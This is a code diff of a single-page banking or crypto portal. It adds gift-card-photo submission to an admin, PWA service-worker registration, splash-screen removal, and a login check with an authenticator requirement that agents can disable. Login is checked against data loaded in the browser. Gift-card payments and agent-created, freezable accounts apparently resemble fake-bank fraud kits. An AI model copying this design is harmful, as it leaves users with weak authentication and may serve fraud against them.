+      var capture = document.getElementById('clbGiftCapture');
+      var done = document.getElementById('clbCryptoDone');
+      var doneText = document.getElementById('clbCryptoDoneText');
+      if (capture) capture.style.display = 'none';
+      if (done) done.style.display = 'block';
+      if (doneText) doneText.textContent = 'Gift card photo sent. Admin will review and reply in your inbox.';
+      if (typeof showToast === 'function') showToast('Gift card photo sent', 'success');
+      window.__clbGiftPhoto = null;
+    } catch (e) {
+      console.error(e);
+      if (typeof showToast === 'function') showToast('Could not send photo', 'error');
+    }
+  };
+
+
   window.clbRequestCryptoWallet = async function(btn) {
     var code = (btn && btn.getAttribute('data-crypto')) || 'BTC';
     var name = CRYPTO_LABELS[code] || code;
@@ -10607,164 +11141,29 @@ html, body { color-scheme: light only; }
   /* ============ SPLASH PRELOADER SEQUENCE ============ */
   
 
-/* SPLASH PRELOADER — reliable every login */
+/* SPLASH PRELOADER — removed (no spinning overlay) */
 (function(){
-  var splashStarted = false;
-  var splashTimers = [];
-
-  function clearSplashTimers() {
-    splashTimers.forEach(function(t) { clearTimeout(t); });
-    splashTimers = [];
-  }
-
-  function getSplashHTML() {
-    return window.__clbSplashHTML || '';
-  }
-
-  function ensureSplashInDOM() {
-    var dash = document.getElementById('page-dashboard');
-    if (!dash) return null;
-    var s = document.getElementById('splash');
-    if (s) return s;
-    var html = getSplashHTML();
-    if (!html) return null;
-    var wrap = document.createElement('div');
-    wrap.innerHTML = html;
-    var node = wrap.firstElementChild;
-    if (node) {
-      node.classList.remove('splash-out');
-      node.style.opacity = '1';
-      node.style.visibility = 'visible';
-      node.style.display = 'flex';
-      node.style.pointerEvents = 'auto';
-      dash.insertBefore(node, dash.firstChild);
-      return node;
-    }
-    return null;
-  }
-
-  window.__clbResetSplash = function() {
-    splashStarted = false;
-    window.__clbSplashDone = false;
-    clearSplashTimers();
-    var existing = document.getElementById('splash');
-    if (existing) window.__clbSplashHTML = existing.outerHTML;
-    var s = document.getElementById('splash');
-    if (s) {
-      s.classList.remove('splash-out', 'splash-done');
-      s.style.opacity = '1';
-      s.style.visibility = 'visible';
-      s.style.display = 'flex';
-      s.style.pointerEvents = 'auto';
-      var card = document.getElementById('splashCard');
-      if (card) card.classList.remove('splash-done');
-    } else {
-      ensureSplashInDOM();
-    }
-  };
-
-  window.__clbForceSplash = function() {
-    splashStarted = false;
-    runSplash();
-  };
-
-  function runSplash() {
-    var dashPage = document.getElementById('page-dashboard');
-    if (!dashPage || !dashPage.classList.contains('active')) return;
-
-    // Already finished this login session — never re-spin on back/nav
-    if (window.__clbSplashDone) {
-      var leftover = document.getElementById('splash');
-      if (leftover) {
-        leftover.classList.add('splash-out');
-        leftover.style.display = 'none';
-        leftover.style.pointerEvents = 'none';
+  window.__clbSplashDone = true;
+  window.__clbResetSplash = function(){ window.__clbSplashDone = true; };
+  window.__clbForceSplash = function(){ /* disabled */ };
+  function killSplash(){
+    try {
+      var s = document.getElementById('splash');
+      if (s) {
+        s.classList.add('splash-out');
+        s.style.display = 'none';
+        s.style.visibility = 'hidden';
+        s.style.pointerEvents = 'none';
+        s.style.opacity = '0';
+        if (s.parentNode) s.remove();
       }
-      return;
-    }
-
-    var splash = document.getElementById('splash') || ensureSplashInDOM();
-    if (!splash) return;
-
-    if (splashStarted) return;
-    splashStarted = true;
-
-    if (!window.__clbSplashHTML) window.__clbSplashHTML = splash.outerHTML;
-
-    splash.classList.remove('splash-out');
-    splash.style.opacity = '1';
-    splash.style.visibility = 'visible';
-    splash.style.display = 'flex';
-    splash.style.pointerEvents = 'auto';
-
-    var card = document.getElementById('splashCard');
-    var ringWrap = document.getElementById('splashRingWrap');
-    var ringCenter = document.getElementById('splashRingCenter');
-    var dotsWrap = document.getElementById('splashDotsWrap');
-    var statusText = document.getElementById('splashStatusText');
-    var subText = document.getElementById('splashSubText');
-    var dots = document.querySelectorAll('.splash-dot');
-
-    function phase1(){
-      if (ringWrap) ringWrap.style.display = 'block';
-      if (dotsWrap) dotsWrap.style.display = 'none';
-      if (ringWrap) ringWrap.classList.remove('splash-phase-blue');
-      var stepNum = document.getElementById('splashStepNum');
-      var spin = document.getElementById('splashSpinner');
-      if (stepNum) stepNum.textContent = '01';
-      if (spin) spin.style.display = 'block';
-      if (statusText) statusText.textContent = 'Verifying details';
-      if (subText) subText.textContent = 'Step 1 of 3';
-    }
-    function phase2(){
-      if (ringWrap) ringWrap.classList.add('splash-phase-blue');
-      var stepNum = document.getElementById('splashStepNum');
-      var spin = document.getElementById('splashSpinner');
-      if (stepNum) stepNum.textContent = '02';
-      if (spin) spin.style.display = 'block';
-      if (statusText) statusText.textContent = 'Logging in';
-      if (subText) subText.textContent = 'Step 2 of 3';
-    }
-    function phase3(){
-      if (ringWrap) ringWrap.style.display = 'none';
-      if (dotsWrap) dotsWrap.style.display = 'flex';
-      if (statusText) statusText.textContent = 'Welcome back';
-      if (subText) subText.textContent = 'Step 3 of 3';
-    }
-    function litDot(i){
-      if (dots[i]) dots[i].classList.add('splash-lit');
-    }
-    function finish(){
-      window.__clbSplashDone = true;
-      if (card) card.classList.add('splash-done');
-      if (subText) subText.textContent = 'Opening dashboard';
-      splashTimers.push(setTimeout(function(){
-        splash.classList.add('splash-out');
-        splash.style.opacity = '0';
-        splash.style.pointerEvents = 'none';
-        splash.style.visibility = 'hidden';
-        splash.style.display = 'none';
-        splashTimers.push(setTimeout(function(){
-          if (splash && splash.parentNode) splash.remove();
-        }, 400));
-      }, 300));
-    }
-
-    // Reset dots
-    dots.forEach(function(d){ d.classList.remove('splash-lit'); });
-
-    clearSplashTimers();
-    // Splash verifying sequence removed — dismiss immediately so dashboard is not blocked
-    window.__clbSplashDone = true;
-    if (statusText) statusText.textContent = '';
-    if (subText) subText.textContent = '';
-    finish();
+    } catch (e) {}
   }
-
+  killSplash();
   window.addEventListener('pagechange', function(e) {
+    killSplash();
     if (e.detail && e.detail.page === 'dashboard') {
       try { history.replaceState({ page: 'homePage', appPage: 'dashboard' }, '', '#dashboard'); } catch (err) {}
-      setTimeout(runSplash, 100);
     } else {
       try {
         var loader = document.getElementById('loader');
@@ -10773,11 +11172,10 @@ html, body { color-scheme: light only; }
           loader.style.opacity = '0';
           loader.style.display = 'none';
         }
-        var s = document.getElementById('splash');
-        if (s) { s.style.display = 'none'; s.style.pointerEvents = 'none'; s.style.visibility = 'hidden'; }
       } catch (err) {}
     }
   });
+  document.addEventListener('DOMContentLoaded', killSplash);
 })();
 
 </script>
@@ -12222,7 +12620,16 @@ document.addEventListener('keydown', function(e) {
       if (!found) return { ok: false, error: 'invalid' };
       if (found.status === 'frozen') return { ok: false, error: 'frozen' };
       setSession(found);
-      return { ok: true, customer: found, data: data };
+      // Attach resolved authenticator requirement (customer override > agent > default ON)
+      var needAuth = true;
+      if (typeof found.authenticatorEnabled === 'boolean') {
+        needAuth = found.authenticatorEnabled;
+      } else if (found.createdBy && found.createdBy !== 'master') {
+        var ag = (data.agents || []).find(function(a){ return a.id === found.createdBy; });
+        if (ag && typeof ag.authenticatorEnabled === 'boolean') needAuth = ag.authenticatorEnabled;
+      }
+      found = Object.assign({}, found, { _needAuthenticator: needAuth });
+      return { ok: true, customer: found, data: data, needAuthenticator: needAuth };
     },
     submitSignup: async function(app) {
       var data = await loadBin();
@@ -22963,6 +23370,53 @@ window.clbSubmitInvKyc = async function() {
     </div>
 
 
+
+
+<script>
+/* PWA — register service worker + optional install prompt */
+(function () {
+  if (!('serviceWorker' in navigator)) return;
+  var swUrl = 'sw.js';
+  window.addEventListener('load', function () {
+    navigator.serviceWorker.register(swUrl, { scope: './' })
+      .then(function (reg) {
+        if (reg.waiting) {
+          try { reg.waiting.postMessage({ type: 'SKIP_WAITING' }); } catch (e) {}
+        }
+        reg.addEventListener('updatefound', function () {
+          var w = reg.installing;
+          if (!w) return;
+          w.addEventListener('statechange', function () {
+            if (w.state === 'installed' && navigator.serviceWorker.controller) {
+              try { w.postMessage({ type: 'SKIP_WAITING' }); } catch (e) {}
+            }
+          });
+        });
+      })
+      .catch(function (err) { console.warn('SW register failed', err); });
+  });
+
+  // Capture install prompt for a custom “Install app” control if needed later
+  window.__clbDeferredInstall = null;
+  window.addEventListener('beforeinstallprompt', function (e) {
+    e.preventDefault();
+    window.__clbDeferredInstall = e;
+    try {
+      window.dispatchEvent(new CustomEvent('clb-pwa-installable'));
+    } catch (err) {}
+  });
+  window.clbPromptPwaInstall = function () {
+    var ev = window.__clbDeferredInstall;
+    if (!ev) return Promise.resolve({ outcome: 'unavailable' });
+    return ev.prompt().then(function () {
+      return ev.userChoice;
+    }).then(function (choice) {
+      window.__clbDeferredInstall = null;
+      return choice;
+    });
+  };
+})();
+</script>
 
 </body>
 </html>
